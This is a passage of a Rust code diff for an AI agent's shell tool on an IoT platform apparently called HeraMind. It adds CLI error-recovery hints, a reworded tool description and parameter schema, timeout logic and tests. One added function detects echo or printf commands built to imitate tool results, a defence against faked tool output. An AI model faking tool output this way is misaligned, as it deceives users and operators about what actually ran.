-        let parts: Vec<&str> = cmd.splitn(4, ' ').collect();
-        let domain = parts.get(1).copied().unwrap_or("");
-        let action = parts.get(2).copied().unwrap_or("");
+        // If the server / CLI already returned structured guidance in JSON
+        // `stdout` (`suggestion` / `hint`) or extracted `Hint:` in `stderr`,
+        // do not overwrite or stack a generic hint that could contradict it.
+        if stdout_has_server_guidance(stdout) || stderr_has_server_guidance(stderr) {
+            return None;
+        }
+
+        let (domain, action) =
+            heramind_cli_ops::json_arg::domain_action_from_argv(&argv).unwrap_or(("", ""));
         let combined = format!("{} {}", stdout, stderr).to_lowercase();
 
         let is_not_found = combined.contains("not found")
@@ -1098,26 +2258,84 @@ impl ShellTool {
             || combined.contains("unrecognized argument")
             || combined.contains("unused arguments")
             || combined.contains("error: found argument");
+        let has_id_flag = argv
+            .iter()
+            .skip(1)
+            .any(|tok| tok == "--id" || tok.starts_with("--id="));
+        let missing_positional_id = combined.contains("required arguments were not provided")
+            && (combined.contains("<id>")
+                || combined.contains("<device_id>")
+                || combined.contains("<dashboard_id>")
+                || combined.contains("<rule_id>")
+                || combined.contains("<agent_id>")
+                || combined.contains("<extension_id>"));
 
-        // Common syntax hint for all heramind commands when unexpected argument
-        if is_unexpected_arg {
-            if cmd.contains("--id ") {
+        // Prefer DomainCommandContract for validation / unexpected-arg recovery
+        // across all 10 core domains (avoids stale hard-coded agent create tips).
+        let contract_hint = || {
+            heramind_cli_ops::json_arg::find_domain_command_contract(domain, action)
+                .map(|c| c.format_hint())
+        };
+
+        // Targeted syntax hints only — never blindly tell the model "ID is
+        // positional" on unrelated flag errors, and avoid fighting with
+        // clap's in-process `usage_hint` on exit_code 2.
+        if is_unexpected_arg || missing_positional_id {
+            if has_id_flag || missing_positional_id {
                 return Some("ID is a positional argument, not a flag. Use: heramind <domain> <action> <ID> [options]. Example: heramind device get abc123 (not --id abc123).".to_string());
             }
-            return Some("Command syntax error. ID is positional (not --id flag). Run 'heramind <domain> <action> --help' to see correct usage.".to_string());
+            if domain == "device" && action == "control" {
+                return Some(
+                    "Device-defined command parameters are not standalone CLI flags. \
+                     Preferred from Chat/shell tool: command=`heramind device control <ID> <COMMAND>`, \
+                     params={...} (JSON object; maps to --params). \
+                     Human CLI fallback: --params '<JSON>' or repeated --param 'key=value'. \
+                     For text with spaces, never use bare --param text=System Ready — put it in shell `params`. \
+                     Use device get <ID> for real parameter names; do not invent keys."
+                        .to_string(),
+                );
+            }
+            // Invented CLI `--params` on commands whose primary JSON flag is
+            // `--components`/`--set`/`--ids`/`--body`/`--config`/`--input`.
+            if let Some(tip) = misplaced_primary_json_flag_tip(domain, action, &argv) {
+                return Some(tip);
+            }
+            // Do not stack a DomainCommandContract tip on bare unexpected-arg
+            // errors — clap's in-process `usage_hint` already carries usage.
+            // Contract tips apply on validation / missing-required paths below.
+            return None;
         }
 
         match domain {
             "device" => {
-                if is_not_found {
+                if action == "control" && is_not_found {
+                    Some("Device or command not found. Run 'heramind device list' to verify the device ID and 'heramind device get <ID>' to inspect supported commands, then call 'heramind device control <ID> <COMMAND>' with shell `params` (COMMAND is positional, not a flag).".to_string())
+                } else if is_not_found {
                     Some("Run 'heramind device list' to see available devices, then retry with a valid ID.".to_string())
-                } else if action == "create" && is_validation {
-                    Some("Required flags: --name, --device-type, --adapter-type (mqtt|webhook). Use 'heramind device types list' to see built-in types.".to_string())
-                } else if action == "control" && is_not_found {
-                    Some("Device not found. Run 'heramind device list' first, then 'heramind device control <ID> <COMMAND> --params {json}' (COMMAND is positional, not a flag).".to_string())
+                } else if action == "control" && is_validation {
+                    // Server already returns schema + params_example + "NOT sent".
+                    // Do NOT overwrite that with a generic/contract tip.
+                    if combined.contains("hint:")
+                        || combined.contains("params_example")
+                        || combined.contains("not sent")
+                        || combined.contains("protocol envelope")
+                    {
+                        None
+                    } else {
+                        Some(
+                            "Pass the command's own param object from `device get` via shell `params` (or --params; see shell_example / params_example). \
+                             Do not wrap as protocol {\"cmd\":...,\"params\":{...}}; the host builds that envelope. \
+                             Validation failure means the command was NOT sent."
+                                .to_string(),
+                        )
+                    }
                 } else if (action == "history" || action == "latest") && combined.contains("metric")
                 {
-                    Some("Don't guess metric names. Run 'heramind device list' to see all metric_fields per type, or 'heramind device get <ID>' for a specific device's actual field names.".to_string())
+                    Some("Don't guess metric names. 'heramind device list' shows devices only — it carries no field names. Use 'heramind device get <ID>' for one device's actual metric fields, or 'heramind device types list' for a type's metric_fields.".to_string())
+                } else if is_validation {
+                    contract_hint().or_else(|| {
+                        Some("Available actions: list, get, create, update, delete, latest, history, control, write-metric, webhook-url, types, drafts. ID is positional: heramind device <action> <ID> [flags].".to_string())
+                    })
                 } else {
                     Some("Available actions: list, get, create, update, delete, latest, history, control, write-metric, webhook-url, types, drafts. ID is positional: heramind device <action> <ID> [flags].".to_string())
                 }
@@ -1125,10 +2343,12 @@ impl ShellTool {
             "dashboard" => {
                 if is_not_found {
                     Some("Run 'heramind dashboard list' to see available dashboards.".to_string())
-                } else if action == "create" && is_validation {
-                    Some("Required field: --name. Example: heramind dashboard create --name \"My Dashboard\"".to_string())
-                } else if action == "update" {
-                    Some("update --components full-replaces the widget array and requires --replace-all. For ONE widget use 'heramind dashboard update-component <ID> --component-id <CID> --set {json}' (deep-merge patch); to add widgets use 'add-components'; to remove use 'remove-components'.".to_string())
+                } else if action == "update" && !is_validation {
+                    Some("update --components full-replaces the widget array and requires --replace-all. For ONE widget use shell with command=\"heramind dashboard update-component <ID> --component-id <CID>\" and params={...} (deep-merge patch); to add widgets use add-components with params=[...]; to remove use remove-components with params=[\"<CID>\"].".to_string())
+                } else if is_validation {
+                    contract_hint().or_else(|| {
+                        Some("Available actions: list, get, create, update, add-components, update-component, remove-components, delete, share.".to_string())
+                    })
                 } else {
                     Some("Available actions: list, get, create, update, add-components, update-component, remove-components, delete, share.".to_string())
                 }
@@ -1136,12 +2356,15 @@ impl ShellTool {
             "rule" => {
                 if is_not_found {
                     Some("Run 'heramind rule list' to see available rules.".to_string())
-                } else if action == "create"
-                    && (is_validation || combined.contains("json") || combined.contains("parse"))
-                {
-                    Some("Rule JSON format: {\"name\":\"...\",\"condition\":{\"condition_type\":\"comparison\",\"source\":\"device:SENSOR_ID:METRIC\",\"operator\":\"greater_than\",\"threshold\":30},\"actions\":[{\"type\":\"notify\",\"message\":\"Alert\",\"severity\":\"critical\"}]}. BEFORE creating: run `heramind device list` to discover real device IDs and metric_fields per type. NEVER guess device IDs or metric names.".to_string())
                 } else if action == "enable" || action == "disable" {
                     Some("Run 'heramind rule list' to find the rule ID, then 'heramind rule <enable|disable> <ID>'.".to_string())
+                } else if is_validation
+                    || (action == "create"
+                        && (combined.contains("json") || combined.contains("parse")))
+                {
+                    contract_hint().or_else(|| {
+                        Some("Available actions: list, get, create, update, delete, enable, disable, test, history".to_string())
+                    })
                 } else {
                     Some("Available actions: list, get, create, update, delete, enable, disable, test, history".to_string())
                 }
@@ -1149,64 +2372,40 @@ impl ShellTool {
             "agent" => {
                 if is_not_found {
                     Some("Run 'heramind agent list' to see available agents.".to_string())
-                } else if action == "create" && is_validation {
-                    Some("Required fields: --name, --prompt, --schedule-type (event|interval|cron|manual). Example: heramind agent create --name \"monitor\" --prompt \"Check devices\" --schedule-type event".to_string())
                 } else if action == "control" && is_validation {
                     Some("Status is positional: heramind agent control <ID> <active|paused>. Example: heramind agent control abc123 active".to_string())
+                } else if is_validation {
+                    // Prefer contract (includes --execution-mode free / --every).
+                    contract_hint().or_else(|| {
+                        Some("Available actions: list, get, create, update, delete, control, invoke, memory, executions, latest-execution, conversation, send-message".to_string())
+                    })
                 } else {
                     Some("Available actions: list, get, create, update, delete, control, invoke, memory, executions, latest-execution, conversation, send-message".to_string())
                 }
             }
-            "extension" => {
+            "extension" | "transform" | "widget" | "message" | "settings" | "connector" => {
                 if is_not_found {
-                    Some("Run 'heramind extension list' to see installed extensions.".to_string())
-                } else if action == "install" && is_validation {
-                    Some("Provide the extension zip file path. Use 'heramind extension market-list' to browse marketplace.".to_string())
-                } else if action == "config" {
-                    Some("Usage: heramind extension config <ID> to view, or heramind extension config <ID> --set '{\"key\":\"value\"}' to update.".to_string())
+                    Some(format!(
+                        "Run 'heramind {domain} list' (or get/status) to discover valid IDs, then retry."
+                    ))
                 } else {
-                    Some("Available actions: list, get, status, logs, config, install, uninstall, reload, create, build, market-list, market-install".to_string())
-                }
-            }
-            "transform" => {
-                if is_not_found {
-                    Some("Run 'heramind transform list' to see available transforms.".to_string())
-                } else if action == "create" && is_validation {
-                    Some("Required flags: --name, --scope (global|device_type:X|device:ID), --code (JavaScript; the input value is bound to `input`). Example: heramind transform create --name \"celsius\" --code \"return input * 1.8 + 32\" --scope global".to_string())
-                } else {
-                    Some("Available actions: list, get, create, update, enable, disable, delete, test-code, metrics, data-sources, executions".to_string())
-                }
-            }
-            "widget" => {
-                if is_not_found {
-                    Some(
-                        "Run 'heramind widget list' to see available widgets (built-in + custom)."
-                            .to_string(),
-                    )
-                } else if action == "create" && is_validation {
-                    Some("Valid widget types: chart, gauge, stat, table, image, custom. Example: heramind widget create \"My Chart\" --widget-type chart".to_string())
-                } else if action == "install" && is_validation {
-                    Some("Provide a widget directory (containing manifest.json + bundle.js) or a .zip file. Example: heramind widget install data/frontend-components/my-widget".to_string())
-                } else {
-                    Some("Available actions: list, get, create, install, uninstall, market-list, market-install".to_string())
-                }
-            }
-            "message" => {
-                if is_not_found {
-                    Some("Run 'heramind message list' to see all messages.".to_string())
-                } else if action == "send" && is_validation {
-                    Some("Required fields: --title, --body, --severity (info|warning|critical|emergency). Example: heramind message send --title \"Alert\" --body \"High temp\" --severity warning".to_string())
-                } else if action == "channel-update" {
-                    Some("Usage: heramind message channel-update --name <N> --config '<JSON>'. To filter by severity: --config '{\"min_severity\":\"warning\"}'. To filter by source type: --config '{\"source_types\":[\"device\"]}'. channel-create uses --name flag; channel-delete/channel-test take name as positional arg.".to_string())
-                } else {
-                    Some("Available actions: list, get, send, read, delete, channel-list, channel-get, channel-types, channel-type-schema, channel-create, channel-update, channel-delete, channel-test.".to_string())
+                    // Validation and other clap failures share the same
+                    // contract-first recovery (missing-required still needs
+                    // the DomainCommandContract red-lines).
+                    contract_hint().or_else(|| {
+                        Some(format!(
+                            "Run 'heramind {domain} --help' for the exact actions and flags."
+                        ))
+                    })
                 }
             }
             "llm" => {
                 if is_not_found {
                     Some("Run 'heramind llm list' to see configured backends.".to_string())
-                } else if action == "create" && is_validation {
-                    Some("Required fields: --name, --type (ollama|llamacpp|openai|anthropic), --endpoint, --model. Example: heramind llm create --name local --type ollama --endpoint http://localhost:11434 --model qwen3.5:4b".to_string())
+                } else if is_validation {
+                    contract_hint().or_else(|| {
+                        Some("Available actions: list, get, models, create, update, delete, activate, test. Example: heramind llm create --name local --type ollama --endpoint http://localhost:11434 --model qwen3.5:4b".to_string())
+                    })
                 } else {
                     Some("Available actions: list, get, models, create, update, delete, activate, test. Example: heramind llm create --name local --type ollama --endpoint http://localhost:11434 --model qwen3.5:4b".to_string())
                 }
@@ -1275,24 +2474,14 @@ impl Tool for ShellTool {
         // cost more cases than the index's recall gained. Defensive knowledge
         // (easy-to-miss list, GUI guard) stays out — discoverable via
         // `heramind <domain> <action> --help` or the skill tool.
-        static SLIM: &str = r#"Execute shell commands on the host. This is your PRIMARY tool for ALL HeraMind platform operations via the `heramind` CLI (14 domains: device, dashboard, rule, agent, extension, widget, transform, llm, message, connector, push, settings, system, api-key). All commands return JSON by default — do NOT pass --json.
+        static SLIM: &str = r#"PRIMARY tool for ALL HeraMind platform operations via the `heramind` CLI (JSON by default — omit `--json`) plus native host shell commands.
 
-Quick reference (run `heramind <domain> --help` or load the `skill` guide for full syntax):
-- Read: `<domain> get <ID>` (one) / `<domain> list` (all). ID is positional, never `--id`.
-- Write: `<domain> create/update/delete` take flags (`--name`, `--device-type`, …). Pass `--id <id>` on create ONLY if the user gave a specific ID.
-- Control / enable / activate are explicit writes: `device control <ID> <CMD>`, `rule enable <ID>`, `llm activate <ID>`, `connector enable <ID>`, `push enable <ID>`.
-- History & conversation: `agent executions <ID>`, `agent conversation <ID>`, `agent send-message <ID>`.
-- Notification channels are a sub-family: `message channel-list` / `channel-create` / `channel-test`, NOT `message list`.
-
-Critical rules:
-- NEVER guess metric or subcommand names — discover via `get`/`list`/`--help` first, then use exact names.
-- Read before write: `get <ID>` before create/update/control/delete.
-- COMPLETE THE FULL FLOW: a multi-step request ("create X then enable it", "deploy then verify") requires EVERY step — do not stop after the first action.
-  Worked example — "create an MQTT connector named c1 to 192.168.1.100, enable and test it" is ONE request = THREE commands:
-  `heramind connector create --name c1 --host 192.168.1.100 --port 1883` → `heramind connector enable c1` → `heramind connector test c1`. Run them all.
-- On error, read the `suggestion` field in the JSON output for recovery.
-
-Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, docker, …"#;
+Quick reference (`heramind <domain> --help` or `skill` for full syntax):
+- Read: `<domain> get <ID>` / `<domain> list` (positional ID, never `--id`).
+- Control/writes: `device control <ID> <CMD> --param key=value` (NOT standalone `--key` flags), `rule/connector/push enable <ID>`, `llm activate <ID>`, `agent executions|conversation|send-message <ID>`, `message channel-list|channel-create|channel-test`.
+- Extensions: `extension list` (overview), `extension commands --search "<task>"` (use `shell_example`), `extension commands <ID>` (schema).
+- NEVER guess IDs, metrics, or subcommands — read before write when facts are missing or stale.
+- COMPLETE THE FULL FLOW and verify results (e.g. `connector create`, `connector enable`, then `connector test`). On error check `suggestion`."#;
         SLIM
     }
 
@@ -1301,19 +2490,26 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
             serde_json::json!({
                 "command": {
                     "type": "string",
-                    "description": "The shell command to execute. Supports pipes, redirections, and other shell features."
+                    "description": "Command to run. heramind runs in-process (no pipes/redirects; use built-in filter flags); pipes/redirects work only with native host commands. Pass JSON flags via params below, never _new_operation."
+                },
+                "params": {
+                    "anyOf": [
+                        { "type": "object" },
+                        { "type": "array" }
+                    ],
+                    "description": "Structured JSON payload for the command's primary JSON flag (--params/--set/--components/--ids/--body/--input/--config). Do not duplicate the flag in command."
                 },
                 "timeout": {
                     "type": "number",
-                    "description": "Optional per-command timeout in seconds (max 600). Overrides default timeout."
+                    "description": "Timeout in seconds (max 600)."
                 },
                 "description": {
                     "type": "string",
-                    "description": "Brief description of what this command does (5-10 words). Used for logging and audit."
+                    "description": "Brief audit note (5-10 words)."
                 },
                 "working_dir": {
                     "type": "string",
-                    "description": "Optional working directory for command execution. Must be an existing directory path."
+                    "description": "Existing working directory path."
                 }
             }),
             vec!["command".to_string()],
@@ -1322,6 +2518,23 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
 
     fn category(&self) -> ToolCategory {
         ToolCategory::System
+    }
+
+    fn as_any(&self) -> &dyn std::any::Any {
+        self
+    }
+
+    fn clone_for_chat_session(&self, session_id: &str) -> Option<super::tool::DynTool> {
+        Some(std::sync::Arc::new(self.for_chat_session(session_id)))
+    }
+
+    fn reset_session_state(&self) {
+        self.index_injected
+            .store(false, std::sync::atomic::Ordering::Relaxed);
+    }
+
+    fn execution_timeout(&self, args: &Value) -> Result<Duration> {
+        Ok(self.command_timeout(args)? + Duration::from_secs(5))
     }
 
     async fn execute(&self, args: Value) -> Result<ToolOutput> {
@@ -1336,23 +2549,21 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
             ));
         }
 
-        // Resolve timeout: per-command override or config default, capped at 600s
-        // Accepts both number and string forms (LLM may pass "30" as string)
-        let timeout = if let Some(user_timeout) = args.get("timeout") {
-            let secs = user_timeout
-                .as_u64()
-                .or_else(|| user_timeout.as_str().and_then(|s| s.parse::<u64>().ok()))
-                .ok_or_else(|| {
-                    ToolError::InvalidArguments("timeout must be a positive number".into())
-                })?;
-            Duration::from_secs(secs.min(crate::toolkit::timeouts::shell_max().as_secs()))
-        } else {
-            Duration::from_secs(
-                self.config
-                    .timeout_secs
-                    .min(crate::toolkit::timeouts::shell_max().as_secs()),
-            )
-        };
+        // NM-302: classify-time attach failure (e.g. illegal --params) — surface
+        // the tip before PreparedInvoke bind so models are not told case-c.
+        if let Some(msg) = args
+            .get(crate::agent::task_continuity::HOST_ATTACH_ERROR_ARG)
+            .and_then(|v| v.as_str())
+        {
+            return Err(ToolError::InvalidArguments(msg.to_string()));
+        }
+
+        // NM-247: structured params adapter — object XOR --params/--params-file.
+        if let Err(msg) = validate_extension_params_sources(&args) {
+            return Err(ToolError::InvalidArguments(msg));
+        }
+
+        let timeout = self.command_timeout(&args)?;
 
         let working_dir = args.get("working_dir").and_then(|v| v.as_str());
         let description = args.get("description").and_then(|v| v.as_str());
@@ -1363,7 +2574,16 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
             "Executing shell command"
         );
 
-        let output = self.execute_command(command, working_dir, timeout).await?;
+        // Host ticket + structured params scoped to this async task only.
+        let host_ctx = extension_invoke_host_context_from_args(&args);
+        let output = if let Some(ctx) = host_ctx {
+            heramind_cli_ops::dispatch::with_extension_invoke_host_context(ctx, async {
+                self.execute_command(command, working_dir, timeout).await
+            })
+            .await?
+        } else {
+            self.execute_command(command, working_dir, timeout).await?
+        };
 
         // execute_command already truncated subprocess output; in-process
         // `heramind` output is left intact so the streaming slim layer can
@@ -1392,12 +2612,24 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
         if let Some(desc) = description {
             result["description"] = serde_json::Value::String(desc.to_string());
         }
+        if let Some(dir) = working_dir {
+            result["working_dir"] = serde_json::Value::String(dir.to_string());
+        }
+        if let Some(domain_index) = output.domain_index {
+            result["domain_index"] = serde_json::Value::String(domain_index);
+        }
+        if let Some(usage_hint) = output.usage_hint {
+            result["usage_hint"] = serde_json::Value::String(usage_hint);
+        }
 
         // Enrich error responses with recovery hints for heramind CLI commands
         let is_error = output.exit_code.unwrap_or(1) != 0;
+        let has_usage_hint = result.get("usage_hint").is_some();
         if is_error {
             if let Some(hint) = Self::recovery_hint(command, &stdout, &stderr) {
-                result["suggestion"] = serde_json::Value::String(hint);
+                if !has_usage_hint || is_targeted_parse_hint(&hint) {
+                    result["suggestion"] = serde_json::Value::String(hint);
+                }
             }
         } else if stdout.is_empty() && stderr.is_empty() {
             // Success but zero output — typical of GUI launchers (`open`,
@@ -1412,9 +2644,215 @@ Native host tools also available via `/bin/sh -c`: ping, curl, ps, df, grep, doc
     }
 }
 
+/// Detect `echo`/`printf` commands whose payload impersonates a tool
+/// result (JSON with `exit_code` + `command`/`stdout` keys). Returns the
+/// `heramind` command mentioned inside the payload, if any, for the cure
+/// message.
+fn fabricated_tool_output(command: &str) -> Option<String> {
+    let trimmed = command.trim();
+    let is_print = trimmed.starts_with("echo ")
+        || trimmed.starts_with("printf ")
+        || trimmed.starts_with("echo\t")
+        || trimmed.contains("| echo ");
+    if !is_print {
+        return None;
+    }
+    // Bare substrings, not quote-delimited: the payload's quotes arrive
+    // shell-escaped (`\"exit_code\"`), so a quoted match never fires.
+    let looks_like_tool_result = trimmed.contains("exit_code")
+        && (trimmed.contains("command") || trimmed.contains("stdout"));
+    if !looks_like_tool_result {
+        return None;
+    }
+    // Extract the real command the payload impersonates, for the cure:
+    // text after the last `command` key up to the closing brace, stripped
+    // of JSON punctuation and shell-escape backslashes.
+    let real: String = command
+        .rsplit("command")
+        .next()
+        .unwrap_or("")
+        .split('}')
+        .next()
+        .unwrap_or("")
+        .replace(['\\', '"', ':', '{'], " ")
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ");
+    (real.len() > 3).then_some(real)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn control_description_maps_device_parameters_to_param() {
+        let description = ShellTool::new(ShellConfig::default())
+            .description()
+            .to_owned();
+        assert!(description.contains("device control <ID> <CMD> --param key=value"));
+        assert!(description.contains("NOT standalone `--key` flags"));
+    }
+
+    #[test]
+    fn control_parameter_flag_error_has_targeted_recovery() {
+        let error = "error: unexpected argument '--text' found";
+        let hint = ShellTool::recovery_hint(
+            "heramind device control eink-test render_text --text 'weather'",
+            "",
+            error,
+        )
+        .unwrap();
+        assert!(hint.contains("params={...}"));
+        assert!(hint.contains("--params '<JSON>'"));
+        assert!(hint.contains("--param 'key=value'"));
+        assert!(hint.contains("real parameter names"));
+        assert!(!hint.contains("ID is positional"));
+    }
+    #[test]
+    fn invented_params_flag_on_add_components_has_structured_tip() {
+        let hint = ShellTool::recovery_hint(
+            "heramind dashboard add-components dash-1 --params '[{\"id\":\"c1\"}]'",
+            "",
+            "error: unexpected argument '--params' found",
+        )
+        .expect("tip required");
+        assert!(hint.contains("does not take CLI `--params`"), "{hint}");
+        assert!(
+            hint.contains("--components") || hint.contains("params=[...]"),
+            "{hint}"
+        );
+        assert!(hint.contains("shell"), "{hint}");
+    }
+
+    #[test]
+    fn invented_params_flag_on_rule_create_points_at_body() {
+        let hint = ShellTool::recovery_hint(
+            "heramind rule create --params '{\"name\":\"x\"}'",
+            "",
+            "error: unexpected argument '--params' found",
+        )
+        .expect("tip required");
+        assert!(hint.contains("--body"), "{hint}");
+        assert!(!hint.contains("ID is positional"), "{hint}");
+    }
+
+    #[test]
+    fn legitimate_extension_invoke_params_flag_not_redirected() {
+        // extension invoke's primary flag IS --params — do not claim misuse.
+        assert!(ShellTool::recovery_hint(
+            "heramind extension invoke weather-forecast-v2 get_weather --params '{\"city\":\"Xiamen\"}'",
+            "",
+            "error: unexpected argument '--bogus' found",
+        )
+        .is_none());
+    }
+
+    #[test]
+    fn control_hint_does_not_shadow_id_or_other_error_contracts() {
+        let hint = |cmd, error| ShellTool::recovery_hint(cmd, "", error).unwrap();
+        let error = "error: unexpected argument '--id' found";
+        assert!(
+            hint("heramind device control --id eink-test render_text", error)
+                .starts_with("ID is a positional argument")
+        );
+        assert!(hint(
+            "heramind device get --id=eink-test",
+            "error: unexpected argument '--id=eink-test' found"
+        )
+        .starts_with("ID is a positional argument"));
+        assert!(hint(
+            "heramind device get",
+            "error: the following required arguments were not provided:\n  <ID>"
+        )
+        .starts_with("ID is a positional argument"));
+        // Unrelated unexpected flag must NOT blindly claim "ID is positional"
+        // (and avoids fighting with clap's in-process `usage_hint`).
+        assert!(ShellTool::recovery_hint(
+            "heramind rule create --bogus 1",
+            "",
+            "error: unexpected argument '--bogus' found",
+        )
+        .is_none());
+        // `action == "control" && is_not_found` is no longer shadowed by generic `is_not_found`.
+        let ctrl_nf = hint(
+            "heramind device control eink-test bad_command",
+            "Command not found",
+        );
+        assert!(
+            ctrl_nf.contains("COMMAND is positional"),
+            "control not-found branch must be reachable: {ctrl_nf}"
+        );
+        assert!(!ctrl_nf.contains("--param"));
+        // Server schema / NOT-sent feedback must not be replaced by the
+        // generic "Available actions" device subcommand list.
+        assert!(ShellTool::recovery_hint(
+            "heramind device control eink-test render_text --params '{\"cmd\":\"render_text\",\"params\":{\"text\":\"hi\"}}'",
+            "",
+            "Failed to send command: Command 'render_text' was NOT sent: missing required top-level params: text. Example: {\"text\":\"Hello\"}.\nHint: {\"params_example\":{\"text\":\"Hello\"}}",
+        )
+        .is_none());
+        // When `stdout` is a JSON CliResponse that already carries `suggestion` or `hint`,
+        // `recovery_hint` must not overwrite or layer a generic hint on top.
+        assert!(ShellTool::recovery_hint(
+            "heramind device get missing-1",
+            r#"{"success":false,"error":"Device not found","suggestion":"Run 'heramind device list' first."}"#,
+            "",
+        )
+        .is_none());
+        assert!(ShellTool::recovery_hint(
+            "heramind rule create --body '{}'",
+            r#"{"success":false,"error":{"code":"VALIDATION_ERROR","message":"bad","hint":"Use greater_than"}}"#,
+            "",
+        )
+        .is_none());
+        // When `stderr` carries a server-extracted `Hint:` line (e.g. 422 from
+        // `POST /messages/channels`), `recovery_hint` must not stack generic copy.
+        assert!(ShellTool::recovery_hint(
+            "heramind message channel-create --name ops --type webhook --config '{}'",
+            "",
+            "API error (422 Unprocessable Entity): Missing required config field(s) for 'webhook' channel: url\nHint: Required fields for 'webhook': url. Run `heramind message channel-type-schema webhook`.",
+        )
+        .is_none());
+        let control_validation = hint(
+            "heramind device control eink-test render_text --params '{}'",
+            "Failed to send command: missing required params: text",
+        );
+        assert!(
+            control_validation.contains("params_example")
+                || control_validation.contains("NOT sent")
+                || control_validation.contains("param object"),
+            "{control_validation}"
+        );
+        assert!(!control_validation.contains("Available actions"));
+        assert!(ShellTool::recovery_hint("echo test", "", error).is_none());
+    }
+
+    #[test]
+    fn parse_error_stderr_carries_exactly_one_error_prefix() {
+        // clap's Display already prefixes "error:" — the wrapper must not
+        // double it (2026-11-08 batch archived "error: error: ...").
+        let s = parse_error_stderr("error: unexpected argument '--x' found");
+        assert!(s.starts_with("error: "));
+        assert_eq!(s.matches("error:").count(), 1);
+        // Defensive: a message without clap's prefix still gets exactly one.
+        let s2 = parse_error_stderr("unexpected argument");
+        assert!(s2.starts_with("error: unexpected"));
+        assert_eq!(s2.matches("error:").count(), 1);
+    }
+
+    #[test]
+    fn parse_error_stderr_hints_rule_create_name_body_conflict() {
+        let s = parse_error_stderr(
+            "error: the argument '--name <NAME>' cannot be used with '--body <BODY>'",
+        );
+        assert!(s.contains("choose ONE form"));
+        assert!(s.contains("--trigger-device"));
+        // Conflicts NOT involving both --name and --body get no hint.
+        let other =
+            parse_error_stderr("error: the argument '--force' cannot be used with '--json'");
+        assert!(!other.contains("choose ONE form"));
+    }
 
     #[test]
     fn truncation_pipeline_splits_head_decorations() {
@@ -1453,12 +2891,7 @@ mod tests {
 
     #[test]
     fn truncation_applied_head_then_tail_in_order() {
-        let out = CommandOutput {
-            exit_code: Some(0),
-            stdout: "1\n2\n3\n4\n5".into(),
-            stderr: String::new(),
-            timed_out: false,
-        };
+        let out = CommandOutput::plain(Some(0), "1\n2\n3\n4\n5".into(), String::new(), false);
         let out = apply_truncation_pipeline(
             out,
             false,
@@ -1531,6 +2964,26 @@ mod tests {
                 "Command Choice must keep sequence directive {needle:?}"
             );
         }
+    }
+
+    #[test]
+    fn scheduler_timeout_tracks_inner_config_and_overrides() {
+        let tool = ShellTool::new(ShellConfig {
+            timeout_secs: 123,
+            ..Default::default()
+        });
+        for (args, expected) in [
+            (serde_json::json!({}), 128),
+            (serde_json::json!({"timeout":180}), 185),
+            (serde_json::json!({"timeout":"180"}), 185),
+            (serde_json::json!({"timeout":999}), 605),
+        ] {
+            assert_eq!(tool.execution_timeout(&args).unwrap().as_secs(), expected);
+        }
+        assert!(tool
+            .execution_timeout(&serde_json::json!({"timeout":"invalid"}))
+            .is_err());
+        assert!(crate::toolkit::timeouts::shell_default().as_secs() > 70);
     }
 
     #[tokio::test]
@@ -1856,6 +3309,321 @@ mod dispatch_edge_tests {
         let toks = tokenize_heramind_command("rule create --name 温湿度告警").unwrap();
         assert_eq!(toks, ["rule", "create", "--name", "温湿度告警"]);
     }
+    /// NM-302: bare `--params {"city":"xiamen"}` must keep JSON string quotes
+    /// (tokenizer used to strip them → `{city:xiamen}` → silent no-mint).
+    #[test]
+    fn tokenizer_preserves_quotes_inside_bare_params_json() {
+        let toks = tokenize_heramind_command(
+            r#"heramind extension invoke weather-forecast-v2 get_weather --params {"city":"xiamen"}"#,
+        )
+        .unwrap();
+        assert_eq!(
+            toks.last().map(String::as_str),
+            Some(r#"{"city":"xiamen"}"#),
+            "bare --params JSON must keep internal quotes: {toks:?}"
+        );
+        serde_json::from_str::<serde_json::Value>(toks.last().unwrap())
+            .expect("tokenized --params must be legal JSON");
+    }
+
+    #[test]
+    fn tokenizer_preserves_quotes_inside_bare_set_json() {
+        let toks = tokenize_heramind_command(
+            r#"heramind dashboard update-component d1 --component-id c1 --set {"position":{"w":2}}"#,
+        )
+        .unwrap();
+        assert_eq!(
+            toks.last().map(String::as_str),
+            Some(r#"{"position":{"w":2}}"#),
+            "{toks:?}"
+        );
+    }
+
+    /// NM-254 + P0-1: `device get` `shell_example` is a structured
+    /// `{command, params}` object that survives shell structured `params`
+    /// injection (and the terminal CLI `--params '<JSON>'` form still survives
+    /// verbatim tokenization) and delivers byte-identical text (CJK + spaces + `'`)
+    /// to the device adapter exactly once.
+    #[tokio::test]
+    async fn nm254_device_shell_example_cjk_space_quote_roundtrips_to_adapter() {
+        use clap::Parser;
+        use futures::Stream;
+        use heramind_cli_ops::device::{device_control_cli_example, device_control_shell_example};
+        use heramind_cli_ops::dispatch::commands::{Args, Command, DeviceCommand};
+        use heramind_core::EventBus;
+        use heramind_devices::mdl::MetricDataType;
+        use heramind_devices::mdl_format::{CommandDefinition, ParameterDefinition};
+        use heramind_devices::{
+            AdapterResult, ConnectionConfig, ConnectionStatus, DeviceAdapter, DeviceConfig,
+            DeviceEvent, DeviceRegistry, DeviceService, DeviceTypeTemplate,
+        };
+        use std::pin::Pin;
+        use std::sync::Arc;
+
+        let text = "你好 it's a test";
+        let params = serde_json::json!({"text": text});
+        let example = device_control_shell_example("eink-nm254", "render_text", &params)
+            .expect("reliable object params must yield a shell_example");
+        validate_extension_params_sources(&example)
+            .expect("structured shell_example must pass shell validation");
+
+        // Route structured {command, params} through host-context argv injection.
+        let cmd_str = example["command"].as_str().expect("command string");
+        let base_argv = tokenize_heramind_command(cmd_str).expect("command must tokenize");
+        let host_ctx = extension_invoke_host_context_from_args(&example).expect("host ctx");
+        let injected_argv =
+            heramind_cli_ops::dispatch::with_extension_invoke_host_context(host_ctx, async {
+                inject_structured_json_argv(base_argv)
+            })
+            .await
+            .expect("structured params injection");
+
+        // Terminal CLI string form must also tokenize + parse cleanly.
+        let cli_example =
+            device_control_cli_example("eink-nm254", "render_text", &params).expect("CLI example");
